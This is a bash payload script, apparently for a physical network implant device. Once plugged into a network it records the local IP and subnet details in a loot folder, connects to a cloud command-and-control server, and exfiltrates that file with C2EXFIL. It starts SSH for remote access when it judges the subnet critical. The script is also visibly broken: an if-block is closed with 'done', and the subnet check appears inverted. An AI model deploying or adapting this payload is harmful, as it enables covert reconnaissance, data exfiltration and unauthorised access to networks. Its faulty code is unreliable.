#!/bin/bash

# IP of critical subnet
IP_MATCH="172*"

# save IP/CIDR obtained to file and exfil to cloud C2
# 0 = false, 1 = true
SAVE_SUBNETS=1

# directory to store output files
LOOT_DIR=/root/loot
# file to store list of subnets (IP/CIDR)
SUBNETS_FILE="$LOOT_DIR/subnets.txt"

# URL to test web connectivity
PUBLIC_TEST_URL="https://google.com"

SERIAL_WRITE "[*] Setting up payload"
LED SETUP
NETMODE DHCP_CLIENT

SERIAL_WRITE "[*] Waiting for IP from DHCP"
LED R SOLID
while ! ifconfig eth0 | grep "inet addr"; do sleep 1; done

# IP/CIDR
SUBNET=$(ip addr | grep -i eth0 | grep -i inet | grep -E -o "([0-9]{1,3}[\.]){3}[0-9]{1,3}[\/]{1}[0-9]{1,2}")
# IP-CIDR (useful for writing to file with this name)
SUBNET_FRIENDLY=$(echo $SUBNET | tr '/' '-')
# /root/loot/IP-CIDR
SUBNET_FILE="$LOOT_DIR/$SUBNET_FRIENDLY"
# IP
IP=${SUBNET%%/*}
SERIAL_WRITE "[*] Obtained IP $SUBNET"

if [ $SAVE_SUBNETS -eq 1 ]; then
  SERIAL_WRITE "[*] Saving network information"
  LED ATTACK
  
  # Optional: write network information to file in LOOT_DIR
  ip a > $SUBNET_FILE
  # append IP/CIDR to subnets.txt
  echo $SUBNET >> $SUBNETS_FILE
fi

SERIAL_WRITE "[*] Checking web connectivity"
LED SPECIAL
if wget --spider "$PUBLIC_TEST_URL" 2>/dev/null; then
  SERIAL_WRITE "[*] Synchronizing time"
  ntpd -q -p pool.ntp.org
  SERIAL_WRITE "[*] Connecting to Cloud C2"
  C2CONNECT
  if [ $SAVE_SUBNETS -eq 1 ]; then
    SERIAL_WRITE "[*] Exfiltrating network information"
    C2EXFIL STRING $SUBNET_FILE "Subnet"
  done
else
  SERIAL_WRITE "[*] No web connectivity"
fi

SERIAL_WRITE "[*] Finished"
if [[ $IP == $IP_MATCH ]]; then
  SERIAL_WRITE "[*] Normal subnet"
  LED FINISH
else
  SERIAL_WRITE "[*] !!! Critical subnet found !!!"
  SERIAL_WRITE "[*] Starting SSH"
  start_ssh
  LED W SOLID
fi